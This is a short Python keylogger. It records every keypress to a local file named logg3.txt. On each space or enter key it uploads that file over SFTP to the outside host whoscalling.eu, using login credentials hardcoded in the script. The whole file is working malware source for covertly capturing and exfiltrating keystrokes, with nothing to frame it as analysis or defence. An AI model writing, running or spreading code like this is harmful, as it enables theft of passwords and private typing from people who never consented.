import os
import string
import keyboard
import paramiko


def osDetect():
    if os.name == 'nt':

        OS = '\\'
        return OS
    elif os.name == 'posix':

        OS = '/'
        return OS


def outreach():
    ssh = paramiko.SSHClient()
    ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
    ssh.connect('whoscalling.eu', username='log', password='logpass13')
    sftp = ssh.open_sftp()
    sftp.put(f'{os.getcwd()}{osDetect()}logg3.txt', 'log.txt')
    sftp.close()
    ssh.close()


def keylogger():
    keyevents = []

    while True:
        file = open(f'{os.getcwd()}{osDetect()}logg3.txt', 'a')

        event = keyboard.read_event()

        if event.event_type == keyboard.KEY_DOWN:
            char = keyboard.read_key()
            print('pressed', char)

            enterkey = char.find(event.name == 'enter')
            spacekey = char.find(event.name == 'space')

            #alle event.names implementieren / filtern

            if enterkey > 0:
                file.write("\n")
            elif spacekey > 0:
                file.write(" ")


            file.write(char)

            if event.name == 'space':
                char = '\n'
                outreach()


            elif event.name == 'enter':
                char = '\n'
                outreach()

            file.close()


if __name__ == '__main__':
    keylogger()
